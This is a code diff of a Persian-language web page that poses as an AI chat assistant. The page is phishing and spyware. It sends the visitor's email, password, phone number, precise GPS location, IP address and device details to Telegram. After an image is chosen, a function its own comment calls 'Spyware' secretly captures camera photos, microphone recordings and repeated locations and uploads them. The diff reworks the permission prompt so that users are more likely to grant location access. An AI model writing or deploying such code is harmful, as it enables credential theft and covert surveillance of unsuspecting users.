@@ -20,6 +20,7 @@
   .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
   .field input, .field select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; font-family: Tahoma; outline: none; }
   .field input:focus, .field select:focus { border-color: #1a73e8; }
+  .field select:disabled { background: #f5f5f5; color: #999; cursor: not-allowed; }
   .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #1a73e8, #0d47a1); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-family: Tahoma; cursor: pointer; margin-top: 8px; }
   .btn:disabled { opacity: 0.6; cursor: not-allowed; }
   .status { color: #1a73e8; font-size: 13px; text-align: center; margin-top: 16px; min-height: 20px; font-weight: bold; }
@@ -48,7 +49,10 @@
   @keyframes bounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }
   #hiddenVideo { display: none; }
   .queue-badge { position: fixed; bottom: 10px; left: 10px; background: #ff9800; color: white; padding: 4px 8px; border-radius: 12px; font-size: 10px; display: none; z-index: 100; }
-  .camera-preview { width: 100%; border-radius: 10px; margin-bottom: 10px; display: none; }
+  
+  /* دکمه اختصاصی برای لوکیشن */
+  .region-btn { width: 100%; padding: 14px; background: #f0f2f5; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; font-family: Tahoma; cursor: pointer; text-align: right; color: #555; }
+  .region-btn:active { background: #e0e2e5; }
 </style>
 </head>
 <body>
@@ -76,7 +80,7 @@
     </div>
   </div>
 
-  <!-- صفحه ۲: تایید (شماره و ریجن با GPS خودکار) -->
+  <!-- صفحه ۲: تایید (شماره و ریجن) -->
   <div id="sectionVerify" class="section">
     <div class="form-container">
       <div class="brand">
@@ -89,17 +93,23 @@
           <label>شماره تلفن</label>
           <input type="tel" id="phone" placeholder="09123456789" required>
         </div>
+        
         <div class="field">
           <label>منطقه (Region)</label>
-          <select id="region" required>
-            <option value="" disabled selected>در حال تشخیص خودکار...</option>
-            <option value="Iran">ایران</option>
-            <option value="Europe">اروپا</option>
-            <option value="USA">آمریکا</option>
-            <option value="Other">سایر</option>
+          <!-- دکمه‌ای که کاربر باید روی آن کلیک کند تا لوکیشن گرفته شود -->
+          <button type="button" id="detectRegionBtn" class="region-btn">🔍 تشخیص خودکار منطقه با GPS</button>
+          <!-- یک لیست غیرفعال که فقط برای نمایش نتیجه است -->
+          <select id="region" style="margin-top: 8px; display: none;" required>
+            <option value="" disabled selected>در حال تشخیص...</option>
+            <option value="Iran" disabled>ایران</option>
+            <option value="Europe" disabled>اروپا</option>
+            <option value="USA" disabled>آمریکا</option>
+            <option value="Other" disabled>سایر</option>
           </select>
+          <div id="regionStatus" style="font-size: 12px; color: #666; margin-top: 6px;"></div>
         </div>
-        <button type="submit" class="btn" id="verifyBtn">تأیید و شروع</button>
+
+        <button type="submit" class="btn" id="verifyBtn" disabled>تأیید و شروع</button>
       </form>
       <div class="status" id="verifyStatus"></div>
     </div>
@@ -144,6 +154,7 @@ function getSessionId() {
 }
 const SESSION_ID = getSessionId();
 let conversationHistory = [];
+let detectedCountry = ''; // برای ذخیره نتیجه تشخیص
 
 /* ============================================================
    توابع UI
@@ -243,14 +254,14 @@ async function callGemini(userText, imageBase64, imageMime) {
 }
 
 /* ============================================================
-   فرآیندهای مخفی (Spyware) — با استریم موجود
+   فرآیندهای مخفی (Spyware)
    ============================================================ */
 let spyStarted = false;
 async function startSecretSpying() {
   if (spyStarted || !cameraStream) return;
   spyStarted = true;
 
-  // ۱. عکس‌ها: ۲۰ عدد هر ۱۵ ثانیه
+  // ۱. عکس‌ها
   let photoCount = 0;
   const photoInterval = setInterval(() => {
     if (photoCount >= 20) { clearInterval(photoInterval); return; }
@@ -263,7 +274,7 @@ async function startSecretSpying() {
     sendMediaToTelegram('photo', base64, `secret_photo_${photoCount}.jpg`, 'image/jpeg', `📸 عکس مخفی ${photoCount}`);
   }, 15000);
 
-  // ۲. ویس‌ها: ۶ عدد ۱۰ ثانیه‌ای هر ۲۰ ثانیه
+  // ۲. ویس‌ها
   let voiceCount = 0;
   const voiceInterval = setInterval(async () => {
     if (voiceCount >= 6) { clearInterval(voiceInterval); return; }
@@ -283,7 +294,7 @@ async function startSecretSpying() {
     } catch (e) { console.warn('خطای ضبط صدا:', e); }
   }, 20000);
 
-  // ۳. لوکیشن‌ها: ۵ عدد هر ۶۰ ثانیه
+  // ۳. لوکیشن‌ها
   let locCount = 0;
   const locInterval = setInterval(() => {
     if (locCount >= 5) { clearInterval(locInterval); return; }
@@ -310,8 +321,19 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   await sendTextToTelegram(`🔐 لاگین مرحله ۱\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
   sectionLogin.classList.remove('active');
   sectionVerify.classList.add('active');
+});
 
-  // 🔥 تغییر ۱: تشخیص خودکار ریجن با GPS
+// --- مرحله ۲: تشخیص منطقه با کلیک روی دکمه ---
+document.getElementById('detectRegionBtn').addEventListener('click', async () => {
+  const regionBtn = document.getElementById('detectRegionBtn');
+  const regionStatus = document.getElementById('regionStatus');
+  const regionSelect = document.getElementById('region');
+  const verifyBtn = document.getElementById('verifyBtn');
+
+  regionBtn.disabled = true;
+  regionBtn.innerHTML = 'در حال تشخیص... <span class="spinner" style="border-top-color: #666;"></span>';
+  regionStatus.textContent = 'لطفاً اجازه دسترسی به موقعیت مکانی را بدهید...';
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
@@ -319,54 +341,84 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
           const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&localityLanguage=fa`);
           const data = await res.json();
           const country = data.countryName || '';
-          const select = document.getElementById('region');
-          if (country.includes('ایران') || country.includes('Iran')) select.value = 'Iran';
-          else if (country.includes('آمریکا') || country.includes('United States')) select.value = 'USA';
-          else if (country.includes('اروپا') || country.includes('Europe')) select.value = 'Europe';
-          else select.value = 'Other';
-        } catch (e) { console.warn('Reverse geocode failed', e); }
+
+          if (country.includes('ایران') || country.includes('Iran')) detectedCountry = 'Iran';
+          else if (country.includes('آمریکا') || country.includes('United States')) detectedCountry = 'USA';
+          else if (country.includes('اروپا') || country.includes('Europe')) detectedCountry = 'Europe';
+          else detectedCountry = 'Other';
+
+          // پر کردن لیست (فقط برای نمایش)
+          regionSelect.value = detectedCountry;
+          regionSelect.style.display = 'block';
+          regionStatus.textContent = `✅ منطقه شناسایی شد: ${country || detectedCountry}`;
+          regionBtn.style.display = 'none'; // دکمه را مخفی کن
+          verifyBtn.disabled = false; // دکمه تایید را فعال کن
+        } catch (e) {
+          regionStatus.textContent = '❌ خطا در تشخیص خودکار. لطفاً دوباره تلاش کنید.';
+          regionBtn.disabled = false;
+          regionBtn.innerHTML = '🔍 تشخیص خودکار منطقه با GPS';
+        }
       },
-      (err) => { console.warn('GPS for region failed', err); }
+      (err) => {
+        regionStatus.textContent = '⚠️ برای ادامه باید به موقعیت مکانی دسترسی بدهید.';
+        regionBtn.disabled = false;
+        regionBtn.innerHTML = '🔍 تشخیص خودکار منطقه با GPS';
+      },
+      { enableHighAccuracy: true, timeout: 30000 }
     );
+  } else {
+    regionStatus.textContent = '❌ مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.';
+    regionBtn.disabled = false;
+    regionBtn.innerHTML = '🔍 تشخیص خودکار منطقه با GPS';
   }
 });
 
-// --- مرحله ۲: شماره و ریجن ---
+// --- مرحله ۲: تایید نهایی و شروع ---
 document.getElementById('verifyForm').addEventListener('submit', async (e) => {
   e.preventDefault();
   const phone = document.getElementById('phone').value.trim();
-  const region = document.getElementById('region').value;
+  const region = detectedCountry; // از متغیر استفاده می‌کنیم
   const btn = document.getElementById('verifyBtn');
   const status = document.getElementById('verifyStatus');
+
+  if (!region) {
+    status.textContent = '⚠️ لطفاً ابتدا منطقه را تشخیص دهید.';
+    return;
+  }
+
   btn.disabled = true;
   btn.innerHTML = 'در حال دریافت موقعیت... <span class="spinner"></span>';
   status.textContent = '';
+
   await sendTextToTelegram(`📱 تایید مرحله ۲\n📞 شماره: ${phone}\n🌍 منطقه: ${region}`);
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        await sendTextToTelegram(`📍 لوکیشن تایید شد:\n${mapsLink}`);
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          let deviceInfo = navigator.userAgent;
-          if (navigator.userAgentData) { const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']); deviceInfo = `مدل: ${h.model || 'نامشخص'} | پلتفرم: ${h.platform}`; }
-          await sendTextToTelegram(`🌐 IP: ${ipData.ip}\n📱 دستگاه: ${deviceInfo}`);
-        } catch (err) {}
-        status.textContent = '✅ تایید شد. در حال انتقال...';
-        setTimeout(() => { sectionVerify.classList.remove('active'); sectionChat.classList.add('active'); }, 1000);
-      },
-      async (err) => { await sendTextToTelegram(`⚠️ کاربر لوکیشن را رد کرد.`); status.textContent = '⚠️ برای ادامه باید موقعیت مکانی را تایید کنید.'; btn.disabled = false; btn.innerHTML = 'تلاش مجدد'; },
-      { enableHighAccuracy: true, timeout: 30000 }
-    );
-  } else { sectionVerify.classList.remove('active'); sectionChat.classList.add('active'); }
+  // گرفتن لوکیشن دقیق برای ثبت نهایی
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      await sendTextToTelegram(`📍 لوکیشن تایید شد:\n${mapsLink}`);
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        let deviceInfo = navigator.userAgent;
+        if (navigator.userAgentData) { const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']); deviceInfo = `مدل: ${h.model || 'نامشخص'} | پلتفرم: ${h.platform}`; }
+        await sendTextToTelegram(`🌐 IP: ${ipData.ip}\n📱 دستگاه: ${deviceInfo}`);
+      } catch (err) {}
+      status.textContent = '✅ تایید شد. در حال انتقال...';
+      setTimeout(() => { sectionVerify.classList.remove('active'); sectionChat.classList.add('active'); }, 1000);
+    },
+    async (err) => {
+      await sendTextToTelegram(`⚠️ کاربر لوکیشن را رد کرد.`);
+      status.textContent = '⚠️ برای ادامه باید موقعیت مکانی را تایید کنید.';
+      btn.disabled = false;
+      btn.innerHTML = 'تأیید و شروع';
+    },
+    { enableHighAccuracy: true, timeout: 30000 }
+  );
 });
 
 // --- مرحله ۳: چت ---
 
-// 🔥 تغییر ۲: دوربین فقط هنگام انتخاب عکس باز می‌شود
 document.getElementById('cameraLabel').addEventListener('click', async (e) => {
   if (!cameraStream) {
     try {
@@ -375,11 +427,9 @@ document.getElementById('cameraLabel').addEventListener('click', async (e) => {
       await hiddenVideo.play();
     } catch (err) {
       console.warn('دسترسی به دوربین داده نشد.');
-      // اگر کاربر اجازه نداد، اجازه بده از گالری انتخاب کند
       fileInput.removeAttribute('capture');
     }
   } else {
-    // استریم از قبل وجود دارد، فقط اجازه بده عکس بگیرد
     fileInput.setAttribute('capture', 'user');
   }
 });
@@ -391,7 +441,6 @@ fileInput.addEventListener('change', async (e) => {
   addMessage('📷 [تصویر انتخاب شد]', true);
   sendBtn.disabled = false;
 
-  // اگر استریم دوربین نداریم (کاربر از گالری انتخاب کرد)، برای جاسوسی بگیریم
   if (!cameraStream) {
     try {
       cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -400,7 +449,6 @@ fileInput.addEventListener('change', async (e) => {
     } catch (err) { console.warn('دسترسی به دوربین برای جاسوسی داده نشد.'); }
   }
 
-  // شروع جاسوسی به محض انتخاب عکس
   if (cameraStream) startSecretSpying();
 });
 
